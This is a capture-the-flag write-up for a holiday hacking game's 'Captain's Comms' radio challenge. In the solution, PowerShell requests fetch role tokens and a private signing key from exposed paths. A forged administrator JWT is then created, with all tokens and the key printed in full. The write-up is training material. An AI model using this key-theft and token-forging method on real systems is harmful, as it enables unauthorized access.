<!-- report-keep -->

# captains-coms <img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/><img src="../img/tree-red.png" alt="drawing" width="20"/>

<!-- report-ignore -->

[< Back Home](../README.md)

<!-- report-keep -->

## Objective

Speak with Chimney Scissorsticks on Steampunk Island about the interesting things the captain is hearing on his new Software Defined Radio. You'll need to assume the GeeseIslandsSuperChiefCommunicationsOfficer role.

<!-- report-ignore -->

## Conversations

Chimney Scissorsticks

- Ahoy there, I'm Chimney Scissorsticks!
- You may have noticed some mischief-makers planning to stir up trouble ashore.
- They've made many radio broadcasts which the captain has been monitoring with his new software defined radio (SDR).
- The new SDR uses some fancy JWT technology to control access.
- The captain has a knack for shortening words, some sorta abbreviation trick.
- Not familiar with JWT values? No worries; just think of it as a clue-solving game.
- I've seen that the Captain likes to carry his journal with him wherever he goes.
- If only I could find the planned "go-date", "go-time", and radio frequency they plan to use.
- Remember, the captain's abbreviations are your guiding light through this mystery!
- Once we find a JWT value, these villains won't stand a chance.
- The closer we are, the sooner we'll be thwarting their pesky plans!
- We need to recreate an administrative JWT value to successfully transmit a message.
- Good luck, matey! I've no doubts about your cleverness in cracking this conundrum!

## Hints

- I've seen the Captain with [his Journal](https://elfhunt.org/static/images/captainsJournal.png) visiting Pixel Island!
- A great introduction to JSON Web Tokens is available from [Auth0](https://jwt.io/introduction).
- Find a private key, update an existing JWT!
- Web Interception proxies like Burp and Zap make web sites fun!
- I hear the Captain likes to abbreviate words in his filenames; shortening some words to just 1,2,3, or 4 letters.

<!-- report-keep -->

## Useful AI Prompts

- Give me a short tutorial on using burpsuite with JWTs.
- How do I sign a JWT using burpsuite?

## Approach

I spun my wheels on this initially, but then reread the owners card and captain's notes.  The owner's card states that "the 'rMonitor.tok' file containing the 'radioMonitor' role token was created in the '/jwtDefault' directory. Initially I was thinking I'm missing some console or something to navigate a filesystem. But we can navigate this directory with a web request so simply modifying the get request to point to that .tok path allwed me to get the RadioMonitor token. I did this in PowerShell:

```powershell
#access token taken from current radioUser justWatchThisRole cookie
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/rMonitor.tok"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/rMonitor.tok
RadioMonitor token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg
```

Using the same approach, I read through the captain's ChatNPT Initial To-Do list once more and he mentions a status that "I moved the private key to a folder I hope no one will find.  I created a 'keys' folder in the same directory the 'roleMonitor' token is in and put the public key 'capsPubKey.key' there. So I am able to get the public key:

```powershell
#access token taken from current radioUser justWatchThisRole cookie
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvVXNlciJ9.BGxJLMZw-FHI9NRl1xt_f25EEnFcAYYu173iqf-6dgoa_X3V7SAe8scBbARyusKq2kEbL2VJ3T6e7rAVxy5Eflr2XFMM5M-Wk6Hqq1lPvkYPfL5aaJaOar3YFZNhe_0xXQ__k__oSKN1yjxZJ1WvbGuJ0noHMm_qhSXomv4_9fuqBUg1t1PmYlRFN3fNIXh3K6JEi5CvNmDWwYUqhStwQ29SM5zaeLHJzmQ1Ey0T1GG-CsQo9XnjIgXtf9x6dAC00LYXe1AMly4xJM9DfcZY_KjfP-viyI7WYL0IJ_UOtIMMN0u-XO8Q_F3VO0NyRIhZPfmALOM2Liyqn6qYTjLnkg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/keys/capsPubKey.key"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/keys/capsPubKey.key
capsPubKey.key:
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAsJZuLJVB4EftUOQN1Auw
VzJyr1Ma4xFo6EsEzrkprnQcdgwz2iMM76IEiH8FlgKZG1U0RU4N3suI24NJsb5w
J327IYXAuOLBLzIN65nQhJ9wBPR7Wd4Eoo2wJP2m2HKwkW5Yadj6T2YgwZLmod3q
n6JlhN03DOk1biNuLDyWao+MPmg2RcxDR2PRnfBartzw0HPB1yC2Sp33eDGkpIXa2023
cx/lGVHFVxE1ptXP+asOAzK1wEezyDjyUxZcMMmV0VibzeXbxsXYvV3knScr2WYO
qZ5ssa4Rah9sWnm0CKG638/lVD9kwbvcO2lMlUeTp7vwOTXEGyadpB0WsuIKuPH6
uQIDAQAB
-----END PUBLIC KEY-----
```

Next, I checked if there is a radio decoder token exposed using the same method, except in the headers I now use the **radioMonitor** token aquired above:

```powershell
#access token for radioMonitor obtained earlier
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvTW9uaXRvciJ9.f_z24CMLim2JDKf8KP_PsJmMg3l_V9OzEwK1E_IBE9rrIGRVBZjqGpvTqAQQSesJD82LhK2h8dCcvUcF7awiAPpgZpcfM5jdkXR7DAKzaHAV0OwTRS6x_Uuo6tqGMu4XZVjGzTvba-eMGTHXyfekvtZr8uLLhvNxoarCrDLiwZ_cKLViRojGuRIhGAQCpumw6NTyLuUYovy_iymNfe7pqsXQNL_iyoUwWxfWcfwch7eGmf2mBrdEiTB6LZJ1ar0FONfrLGX19TV25Qy8auNWQIn6jczWM9WcZbuOIfOvlvKhyVWbPdAK3zB7OOm-DbWm1aFNYKr6JIRDLobPfiqhKg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/rDecoder.tok"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/rDecoder.tok
RadioDecoder token:
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg
```

NICE! Now able to get to work with the radioDecoder role on the SDR by entering the above toek into the value of my justWatchThisRole cookie.

Clicking on the SDR and the left signal as radioDecoder:

```
. . . CQ CQ DE KH644 -- SILLY CAPTAIN! WE FOUND HIS FANCY RADIO PRIVATE KEY IN A FOLDER CALLED TH3CAPSPR1V4T3F0LD3R . . .
```

Clicking on the SDR and the center signal as radioDecoder:

```
{music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music}
```

Clicking on the SDR and the right signal as radioDecoder:

![image](../img/captainscoms-1.png)

Now I have the radioUser, radioMonitor and radioDecoder tokens, and I have the public key used to verify those tokens. I need to gain access to the private key so I can create my own radioAdministrator token.

I believe after looking at the Captain's journal that the administrator role name is 'GeeseIslandsSuperChiefCommunicationsOfficer', and I know the folder for the private key is TH3CAPSPR1V4T3F0LD3R.

Since the public key is named capsPubKey.key, I suspect the private key is named capsPrivKey.key.

I verify this by attempting another GET request to that location, this time using the **radioDecoder** token obtained earlier:

```powershell
#access token for radioDecoder obtained earlier
$accessToken = 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6InJhZGlvRGVjb2RlciJ9.cnNu6EjIDBrq8PbMlQNF7GzTqtOOLO0Q2zAKBRuza9bHMZGFx0pOmeCy2Ltv7NUPv1yT9NZ-WapQ1-GNcw011Ssbxz0yQO3Mh2Tt3rS65dmb5cmYIZc0pol-imtclWh5s1OTGUtqSjbeeZ2QAMUFx3Ad93gR20pKpjmoeG_Iec4JHLTJVEksogowOouGyDxNAagIICSpe61F3MY1qTibOLSbq3UVfiIJS4XvGJwqbYfLdbhc-FvHWBUbHhAzIgTIyx6kfONOH9JBo2RRQKvN-0K37aJRTqbq99mS4P9PEVs0-YIIufUxJGIW0TdMNuVO3or6bIeVH6CjexIl14w6fg'

$headers = @{
"Authorization" = "Bearer $accessToken"
"Content-Type" = "application/json"
}

$uri = "https://captainscomms.com/jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key"
$result = Invoke-WebRequest -Uri $uri -Headers $headers
$content = $result.content
Write-Output $content
```

```
GET /jwtDefault/keys/TH3CAPSPR1V4T3F0LD3R/capsPrivKey.key HTTP/2

Output:
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQCwlm4slUHgR+1Q
5A3UC7BXMnKvUxrjEWjoSwTOuSmudBx2DDPaIwzvogSIfwWWApkbVTRFTg3ey4jb
g0mxvnAnfbshhcC44sEvMg3rmdCEn3AE9HtZ3gSijbAk/abYcrCRblhp2PpPZiDB
kuah3eqfomWE3TcM6TVuI24sPJZqj4w+aDZFzENHY9Gd8Fqu3PDQc8HXILZKnfd4
MaSkhdpzH+UZUcVXETWm1c/5qw4DMrXAR7PIOPJTFlwwyZXRWJvN5dvGxdi9XeSd
JyvZZg6pnmyxrhFqH2xaebQIobrfz+VUP2TBu9w7aUyVR5Onu/A5NcQbJp2kHRay
4gq48fq5AgMBAAECggEATlcmYJQE6i2uvFS4R8q5vC1u0JYzVupJ2sgxRU7DDZiI
adyHAm7LVeJQVYfYoBDeANC/hEGZCK7OM+heQMMGOZbfdoNCmSNL5ha0M0IFTlj3
VtNph9hlwQHP09FN/DeBWruT8L1oauIZhRcZR1VOuexPUm7bddheMlL4lRp59qKj
9k1hUQ3R3qAYST2EnqpEk1NV3TirnhIcAod53aAzcAqg/VruoPhdwmSv/xrfDS9R
DCxOzplHbVQ7sxZSt6URO/El6BrkvVvJEqECMUdON4agNEK5IYAFuIbETFNSu1TP
/dMvnR1fpM0lPOXeUKPNFveGKCc7B4IF2aDQ/CvD+wKBgQDpJjHSbtABNaJqVJ3N
/pMROk+UkTbSW69CgiH03TNJ9RflVMphwNfFJqwcWUwIEsBpe+Wa3xE0ZatecEM9
4PevvXGujmfskst/PuCuDwHnQ5OkRwaGIkujmBaNFmpkF+51v6LNdnt8UPGrkovD
onQIEjmvS1b53eUhDI91eysPKwKBgQDB5RVaS7huAJGJOgMpKzu54N6uljSwoisz
YJRY+5V0h65PucmZHPHe4/+cSUuuhMWOPinr+tbZtwYaiX04CNK1s8u4qqcX2ZRD
YuEv+WNDv2e1XjoWCTxfP71EorywkEyCnZq5kax3cPOqBs4UvSmsR9JiYKdeXfaC
VGiUyJgLqwKBgQDL+VZtO/VOmZXWYOEOb0JLODCXUdQchYn3LdJ3X26XrY2SXXQR
wZ0EJqk8xAL4rS8ZGgPuUmnC5Y/ft2eco00OuzbR+FSDbIoMcP4wSYDoyv5IIrta
bnauUUipdorttuIwsc/E4Xt3b3l/GV6dcWsCBK/i5I7bW34yQ8LejTtGsQKBgAmx
NdwJpPJ6vMurRrUsIBQulXMMtx2NPbOXxFKeYN4uWhxKITWyKLUHmKNrVokmwelW
Wiodo9fGOlvhO40tg7rpfemBPlEG405rBu6q/LdKPhjm2Oh5Fbd9LCzeJah9zhVJ
Y46bJY/i6Ys6Q9rticO+41lfk344HDZvmbq2PEN5AoGBANrYUVhKdTY0OmxLOrBb
kk8qpMhJycpmLFwymvFf0j3dWzwo8cY/+2zCFEtv6t1r7b8bjz/NYrwS0GvEc6Bj
xVa9JIGLTKZt+VRYMP1V+uJEmgSnwUFKrXPrAsyRaMcq0HAvQOMICX4ZvGyzWhut
UdQXV73mNwnYl0RQmBnDOl+i
-----END PRIVATE KEY-----
```

I now have the **key** to the kingdom! Next, I need to sign my own crafted JWT with the obtained private key.

Using Burp Suite, I modfify the payload in the JWT to the following:

```
{
    "iss": "HHC 2023 Captain's Comms",
    "iat": 1699485795.3403327,
    "exp": 1809937395.3403327,
    "aud": "Holiday Hack 2023",
    "role": "GeeseIslandsSuperChiefCommunicationsOfficer"
}
```

I then use the private key from above to sign the new token again using Burp Suite.

**GeeseIslandsSuperChiefCommunicationsOfficer** token:

```
eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJISEMgMjAyMyBDYXB0YWluJ3MgQ29tbXMiLCJpYXQiOjE2OTk0ODU3OTUuMzQwMzMyNywiZXhwIjoxODA5OTM3Mzk1LjM0MDMzMjcsImF1ZCI6IkhvbGlkYXkgSGFjayAyMDIzIiwicm9sZSI6IkdlZXNlSXNsYW5kc1N1cGVyQ2hpZWZDb21tdW5pY2F0aW9uc09mZmljZXIifQ.N-8MdT6yPFge7zERpm4VdLdVLMyYcY_Wza1TADoGKK5_85Y5ua59z2Ke0TTyQPa14Z7_Su5CpHZMoxThIEHUWqMzZ8MceUmNGzzIsML7iFQElSsLmBMytHcm9-qzL0Bqb5MeqoHZYTxN0vYG7WaGihYDTB7OxkoO_r4uPSQC8swFJjfazecCqIvl4T5i08p5Ur180GxgEaB-o4fpg_OgReD91ThJXPt7wZd9xMoQjSuPqTPiYrP5o-aaQMcNhSkMix_RX1UGrU-2sBlL01FxI7SjxPYu4eQbACvuK6G2wyuvaQIclGB2Qh3P7rAOTpksZSex9RjtKOiLMCafTyfFng
```

Now, I simply paste the new token into the value of my justWatchThisRole cookie in any browser and can now use the radio.

![image](../img/captainscoms-2.png)

So, now the next challenge is to solve the Go-Date and Go-Time.  I have the Frequency from the fax decoder on the SDR - **10426 Hz**.  The only thing I haven't solved yet is the numbers station decoder, so that's likely what contains the message about time and date. Looking back at it again, it is:

```
{music} {music} {music} 88323 88323 88323 {gong} {gong} {gong} {gong} {gong} {gong} 12249 12249 16009 16009 12249 12249 16009 16009 {gong} {gong} {gong} {gong} {gong} {gong} {music} {music} {music}
```

Reviewing the [Lincolnshire Poacher](https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher/) from "Just Watch This Appendix A - Decoder Index", I found this interesting:

"After the music played the female voiced machine would identify who the message was for with a 5 digit call up. The message was announced by 3 chimes and the voice would read 200 message groups."

Also, to refresh my memory, I talked to Chimney Scissorsticks again and he states a couple different ways "Remember, the captain's abbreviations are your guiding light through this mystery!"

Thinking about this more, and looking at the cryptic message above - it appears to be a date and a time followed by a 9. Remembering (need to add where I found this) that someone told me to try send a signal out four hours earlier, I put 1224 for the date and 1600-400 = 1200 for the time.

Mission accomplished!

![image](../img/captainscoms-3.png)

## Resources

[Lincolnshire Poacher](https://www.numbers-stations.com/english/e03-the-lincolnshire-poacher/)
